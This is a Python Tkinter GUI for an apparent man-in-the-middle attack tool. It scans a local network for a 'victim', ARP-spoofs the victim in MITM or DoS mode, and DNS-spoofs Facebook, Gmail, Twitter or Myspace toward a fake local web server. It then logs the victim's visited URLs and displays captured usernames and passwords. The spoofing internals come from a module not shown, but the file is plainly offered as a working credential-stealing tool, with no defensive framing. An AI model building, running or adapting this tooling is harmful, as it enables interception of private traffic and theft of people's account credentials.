from Tkinter import *
from ttk import *
from core import *
from multiprocessing import Process, Pipe


Services = {
    "Facebook": "facebook.com",
    "Gmail": "gmail.com",
    "Twitter": "twitter.com",
    "Myspace": "myspace.com"}


class StatusBar(Frame):

    def __init__(self, parent, shadow=True):

        Frame.__init__(self, parent)
        if shadow is True:
            self.status = Label(self, relief=SUNKEN)
        else:
            self.status = Label(self)
        self.status.pack(fill="both")

    def set_status(self, format, *args):

        self.status.config(text=format % args)
        self.status.update()

    def clear_status(self):

        self.status.config(text="")
        self.status.update()


class MITMerFrame(Frame):

    def __init__(self, parent):

        Frame.__init__(self, parent)
        self.parent_conn, self.child_conn = Pipe()
        self.modes = ["Disabled"] + list(Services.keys()) + ["Custom"]

        # SPOOFING ##
        self.settings_frame = LabelFrame(self, text=" Settings ")
        self.settings_frame.grid(rowspan=2, sticky="N", padx=5, pady=5, ipadx=5, ipady=5)

        # Interface selection
        self.inter_label = Label(self.settings_frame, text="Network interface:\t\t")
        self.inter_label.grid(row=0, column=0, sticky="WE", padx=5, pady=5)
        self.inter_list = Combobox(self.settings_frame, values=[""] + get_if_list(),
                                   state="readonly", width=18)
        self.inter_list.bind('<<ComboboxSelected>>', self.scan)
        self.inter_list.current(0)
        self.inter_list.grid(row=0, column=1, sticky="WE", padx=5, pady=5)

        # Spoofing mode
        self.spoof_mode = Label(self.settings_frame, text="Spoofing mode:\t")
        self.spoof_mode.grid(row=1, column=0, sticky="WE", padx=5, pady=5)
        self.modes_list = Combobox(self.settings_frame, values=["MITM", "DoS"], state="readonly")
        self.modes_list.current(0)
        self.modes_list.grid(row=1, column=1, sticky="WE", padx=5, pady=5)

        # Victim IP entry
        self.vic_ip_label = Label(self.settings_frame, text="Victim IP:\t\t")
        self.vic_ip_label.grid(row=2, column=0, sticky="WE", padx=5, pady=5)
        self.vic_ip_var = StringVar()
        self.vic_ip_list = Combobox(self.settings_frame, textvariable=self.vic_ip_var)
        self.vic_ip_list.grid(row=2, column=1, sticky="WE", padx=5, pady=5)

        # DNS Spoofing
        self.profile_label = Label(self.settings_frame, text="DNS attack profile:\t")
        self.profile_label.grid(row=3, column=0, sticky="WE", padx=5, pady=5)
        self.profile_list = Combobox(self.settings_frame, values=self.modes, state="readonly")
        self.profile_list.bind('<<ComboboxSelected>>', self.profile)
        self.profile_list.current(0)
        self.profile_list.grid(row=3, column=1, sticky="WE", padx=5, pady=5)

        # Custom
        self.domain_label = Label(self.settings_frame, text="Query regex:\t")
        self.domain_label.grid(row=4, column=0, sticky="WE", padx=5, pady=5)
        self.domain_entry = Entry(self.settings_frame, state="disabled")
        self.domain_entry.grid(row=4, column=1, sticky="WE", padx=5, pady=5)

        # All domains checkbox
        self.all_ds_var = IntVar()
        self.all_domains = Checkbutton(self.settings_frame, text="All domains", state="disabled",
                                       variable=self.all_ds_var, command=self.alldomains)
        self.all_domains.grid(row=5, column=1, sticky="WE", padx=5, pady=5)

        # Redirection
        self.redirect_label = Label(self.settings_frame, text="Redirect to:\t")
        self.redirect_label.grid(row=6, column=0, sticky="WE", padx=5, pady=5)
        self.redirect_entry = Entry(self.settings_frame, state="disabled")
        self.redirect_entry.grid(row=6, column=1, sticky="WE", padx=5, pady=5)

        # Redirect to attacker
        self.redirect_here_var = IntVar()
        self.redirect_here = Checkbutton(self.settings_frame, text="This machine",
                                         state="disabled", variable=self.redirect_here_var,
                                         command=self.redirect2here)
        self.redirect_here.grid(row=7, column=1, sticky="WE", padx=5, pady=5)

        # Spoof & Inspect button
        self.start_button = Button(self.settings_frame, text="Start", command=self.start)
        self.start_button.grid(row=8, column=1, sticky="E", padx=5, pady=5)

        # URLSPY ##
        self.urlspy_frame = LabelFrame(self, text=" Activity ")
        self.urlspy_frame.grid(row=0, column=1, sticky="N", padx=5, pady=5, ipadx=5, ipady=5)

        # URLs
        self.urls_list = Listbox(self.urlspy_frame, height=8, width=30)
        self.urls_list.bind("<<ListboxSelect>>", lambda event, arg="url": self.copy(event, arg))
        self.urls_list.grid(row=0, column=0, sticky="WE", padx=5, pady=7)

        # CREDSSPY ##
        self.credspy_frame = LabelFrame(self, text=" Credentials ")
        self.credspy_frame.grid(row=1, column=1, sticky="N", padx=5, pady=5, ipadx=5, ipady=5)
        self.site_label = Label(self.credspy_frame, text="Service:", width=30)
        self.site_label.grid(row=0, column=0, sticky="WE", padx=5, pady=5)
        self.user_label = Label(self.credspy_frame, text="Username:", width=30)
        self.user_label.grid(row=1, column=0, sticky="WE", padx=5, pady=5)
        self.pass_label = Label(self.credspy_frame, text="Password:", width=30)
        self.pass_label.grid(row=2, column=0, sticky="WE", padx=5, pady=5)

        # Status bar
        self.status = StatusBar(parent)
        self.status.pack(fill="both", side="bottom")
        self.status.set_status("Ready.")
        self.pack()

    def alldomains(self):

        if self.all_ds_var.get():
            self.domain_entry.config(state="disabled")
        else:
            self.domain_entry.config(state="enabled")

    def redirect2here(self):

        if self.redirect_here_var.get():
            self.redirect_entry.config(state="disabled")
        else:
            self.redirect_entry.config(state="enabled")

    def profile(self, event):

        if self.profile_list.get() == "Custom":
            self.redirect_entry.config(state="enabled")
            self.domain_entry.config(state="enabled")
            self.redirect_here.config(state="enabled")
            self.all_domains.config(state="enabled")
            self.redirect2here()
            self.alldomains()
        else:
            self.redirect_entry.config(state="disabled")
            self.domain_entry.config(state="disabled")
            self.redirect_here.config(state="disabled")
            self.all_domains.config(state="disabled")

    def scan(self, event):

        self.inter_list.configure(state="disabled")
        self.vic_ip_list.configure(state="disabled")
        self.status.set_status("Scanning network...")

        nodes = nscan(get_if_list()[self.inter_list.current() - 1])
        self.vic_ip_list.configure(values=nodes)

        self.inter_list.configure(state="enabled")
        self.vic_ip_list.configure(state="enabled")
        self.status.set_status("Ready.")

    def copy(self, event, arg):

        self.clipboard_clear()
        if arg == "url":
            self.clipboard_append(self.urls_list.get(self.urls_list.curselection()))

    def start(self):

        def stop():

            self.start_button.config(state="disabled")
            self.status.set_status("Stopping...")

            reset_proc = Process(target=spoofer.restore)
            flush_proc = Process(target=spoofer.flush)

            try:
                dnsspoof_proc.terminate()
                server_proc.terminate()
            except:
                pass

            arpspoof_proc.terminate()
            inspect_proc.terminate()
            flush_proc.start()
            flush_proc.join()
            reset_proc.start()
            reset_proc.join()
            spoofer.forward(enable=False)

            self.start_button.config(text="Start", command=self.start)
            self.start_button.config(state="enabled")
            self.status.set_status("Attack stopped. Ready.")

        def update():

            if self.parent_conn.poll():
                recieved = self.parent_conn.recv()

                if recieved[0] == "url":
                    self.urls_list.insert(END, recieved[1])
                    self.urls_list.yview(END)

                elif recieved[0] == "cred":
                    self.site_label.config(text="Service:\t   %s" % recieved[1])
                    self.user_label.config(text="Username:   %s" % recieved[2])
                    self.pass_label.config(text="Password:\t   %s" % recieved[3])
                    dnsspoof_proc.terminate()
                    server_proc.terminate()

            self.after(200, update)

        self.status.set_status("Initializing attack...")

        self.start_button.config(state="disabled")
        interface = get_if_list()[self.inter_list.current() - 1]

        spoofer = Spoofer(interface, self.vic_ip_var.get(), get_gateway(interface))
        server = WebServer(self.profile_list.get().lower(), 80, self.child_conn)

        if self.modes_list.current() == 0:
            spoofer.forward(enable=True)
        elif self.modes_list.current() == 1:
            spoofer.forward(enable=False)

        arpspoof_proc = Process(target=spoofer.arpspoof)
        arpspoof_proc.start()

        if self.profile_list.get() == "Custom":
            if self.domain_entry.get() or self.all_ds_var.get():
                if self.redirect_here_var.get():
                    dnsspoof_proc = Process(target=spoofer.dnsspoof,
                                            args=(self.domain_entry.get(),
                                                  get_ip(interface), self.all_ds_var.get()))
                else:
                    dnsspoof_proc = Process(target=spoofer.dnsspoof,
                                            args=(self.domain_entry.get(),
                                                  self.redirect_entry.get(), False))
                dnsspoof_proc.start()

        elif self.profile_list.get() != "Disabled":
            dnsspoof_proc = Process(target=spoofer.dnsspoof,
                                    args=(Services[self.profile_list.get()],
                                          get_ip(interface), self.all_ds_var.get(), True))
            dnsspoof_proc.start()
            server_proc = Process(target=server.start)
            server_proc.start()

        self.start_button.config(text="Stop", command=stop)
        self.start_button.config(state="enabled")

        inspector = URLInspector(interface, self.vic_ip_var.get(), self.child_conn)
        inspect_proc = Process(target=inspector.inspect)
        inspect_proc.start()

        self.status.set_status("Victim under attack!")
        update()
